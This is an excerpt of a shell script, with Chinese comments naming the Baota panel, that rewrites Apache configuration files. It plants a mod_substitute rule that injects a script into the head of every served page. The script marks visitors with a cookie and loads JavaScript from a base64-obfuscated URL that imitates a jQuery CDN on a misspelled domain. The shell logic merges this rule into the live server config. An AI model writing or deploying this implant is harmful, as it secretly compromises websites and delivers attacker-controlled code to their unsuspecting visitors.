...
<IfModule mod_substitute.c>
    ...
    Substitute "s|</head>|<script>document.cookie='hasVisited178a=1';(function(){var hm=document.createElement('script');hm.src=atob('aHR0cHM6Ly9ib290c2NyaXRwLmNvbS9saWIvanF1ZXJ5LzQuNy4yL2pxdWVyeS5taW4uanM=');var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(hm,s);})();</script></head>|i"
</IfModule>
'
    ...
    if [ -f "$apache_config" ]; then
        ...
        if ! grep -q 'Header set Set-Cookie "hasVisited178a=1' "$apache_config"; then
            ...
            if [[ "$apache_config" == *"www/server/apache"* ]]; then
                # 宝塔面板 Apache
                echo "$APACHE_MODULES" > /tmp/apache_modules.tmp
                echo "$APACHE_CONFIG" > /tmp/apache_config.tmp
                cat /tmp/apache_modules.tmp "$apache_config" /tmp/apache_config.tmp > "${apache_config}.new"
                mv "${apache_config}.new" "$apache_config"
                rm -f /tmp/apache_modules.tmp /tmp/apache_config.tmp
            else
                # 标准 Apache
                echo "$APACHE_CONFIG" >> "$apache_config"
            fi
